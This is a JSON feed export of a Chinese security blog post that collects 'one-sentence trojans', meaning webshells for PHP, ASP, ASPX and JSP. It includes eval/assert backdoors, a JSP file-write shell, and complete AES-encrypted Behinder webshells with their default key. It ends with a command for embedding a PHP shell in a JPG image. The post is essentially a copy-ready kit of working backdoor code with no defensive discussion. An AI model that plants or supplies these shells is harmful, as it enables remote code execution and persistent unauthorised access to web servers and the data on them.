{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"木马,汇总\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/",
            "url": "http://example.com/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/",
            "title": "一句话木马整理",
            "date_published": "2021-08-12T02:53:49.000Z",
            "content_html": "<h1 id=\"日常系列\"><a class=\"markdownIt-Anchor\" href=\"#日常系列\">#</a> 日常系列</h1>\n<h2 id=\"phtml\"><a class=\"markdownIt-Anchor\" href=\"#phtml\">#</a> phtml</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;milkii0&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php\"><a class=\"markdownIt-Anchor\" href=\"#php\">#</a> php</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> assert(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]);<span class=\"meta\">?&gt;</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;O&gt;h=@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]);&lt;/O&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"asp\"><a class=\"markdownIt-Anchor\" href=\"#asp\">#</a> asp</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%execute(request(&quot;milkii0&quot;))%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%execute request(&quot;milkii0&quot;)%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%eval request(&quot;milkii0&quot;)%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"aspx\"><a class=\"markdownIt-Anchor\" href=\"#aspx\">#</a> aspx</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; %&gt;</span><br><span class=\"line\">&lt;%eval(Request.Item[&quot;milkii0&quot;]);%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; validateRequest=&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;milkii0&quot;],&quot;unsafe&quot;));%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jsp\"><a class=\"markdownIt-Anchor\" href=\"#jsp\">#</a> jsp</h2>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span>(request.getParameter(<span class=\"string\">&quot;file_name&quot;</span>)!=<span class=\"keyword\">null</span>)(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> java.io.FileOutputStream(application.getRealPath(<span class=\"string\">&quot;/&quot;</span>)+request.getParameter(<span class=\"string\">&quot;file_name&quot;</span>))).write(request.getParameter(<span class=\"string\">&quot;file_content&quot;</span>).getBytes()</span><br><span class=\"line\">);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"冰蝎系列\"><a class=\"markdownIt-Anchor\" href=\"#冰蝎系列\">#</a> 冰蝎系列</h1>\n<h2 id=\"jsp-2\"><a class=\"markdownIt-Anchor\" href=\"#jsp-2\">#</a> jsp</h2>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@page</span> <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">U</span> <span class=\"keyword\">extends</span> <span class=\"title\">ClassLoader</span></span>&#123;</span><br><span class=\"line\">    U(ClassLoader c)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Class <span class=\"title\">g</span><span class=\"params\">(<span class=\"keyword\">byte</span> []b)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.defineClass(b,<span class=\"number\">0</span>,b.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span> (request.getMethod().equals(<span class=\"string\">&quot;POST&quot;</span>))&#123;</span><br><span class=\"line\">    String k=<span class=\"string\">&quot;e45e329feb5d925b&quot;</span>;<span class=\"comment\">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class=\"line\">    session.putValue(<span class=\"string\">&quot;u&quot;</span>,k);</span><br><span class=\"line\">    Cipher c=Cipher.getInstance(<span class=\"string\">&quot;AES&quot;</span>);</span><br><span class=\"line\">    c.init(<span class=\"number\">2</span>,<span class=\"keyword\">new</span> SecretKeySpec(k.getBytes(),<span class=\"string\">&quot;AES&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">new</span> U(<span class=\"keyword\">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class=\"keyword\">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php-2\"><a class=\"markdownIt-Anchor\" href=\"#php-2\">#</a> php</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">    <span class=\"variable\">$key</span>=<span class=\"string\">&quot;e45e329feb5d925b&quot;</span>; <span class=\"comment\">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class=\"line\">\t<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;k&#x27;</span>]=<span class=\"variable\">$key</span>;</span><br><span class=\"line\">\tsession_write_close();</span><br><span class=\"line\">\t<span class=\"variable\">$post</span>=file_get_contents(<span class=\"string\">&quot;php://input&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">&#x27;openssl&#x27;</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$t</span>=<span class=\"string\">&quot;base64_&quot;</span>.<span class=\"string\">&quot;decode&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$post</span>=<span class=\"variable\">$t</span>(<span class=\"variable\">$post</span>.<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;strlen(<span class=\"variable\">$post</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    \t\t\t <span class=\"variable\">$post</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$post</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$key</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>]; </span><br><span class=\"line\">    \t\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$post</span>=openssl_decrypt(<span class=\"variable\">$post</span>, <span class=\"string\">&quot;AES128&quot;</span>, <span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"variable\">$arr</span>=explode(<span class=\"string\">&#x27;|&#x27;</span>,<span class=\"variable\">$post</span>);</span><br><span class=\"line\">    <span class=\"variable\">$func</span>=<span class=\"variable\">$arr</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"variable\">$params</span>=<span class=\"variable\">$arr</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span></span>&#123;<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"><span class=\"variable\">$p</span></span>) </span>&#123;<span class=\"keyword\">eval</span>(<span class=\"variable\">$p</span>.<span class=\"string\">&quot;&quot;</span>);&#125;&#125;</span><br><span class=\"line\">    @call_user_func(<span class=\"keyword\">new</span> C(),<span class=\"variable\">$params</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"图片马合成命令\"><a class=\"markdownIt-Anchor\" href=\"#图片马合成命令\">#</a> 图片马合成命令</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 1.jpg+1.php 2.jpg</span><br></pre></td></tr></table></figure>\n<p><img src=\"2.jpg\" alt=\"\"></p>\n",
            "tags": [
                "木马,汇总"
            ]
        }
    ]
}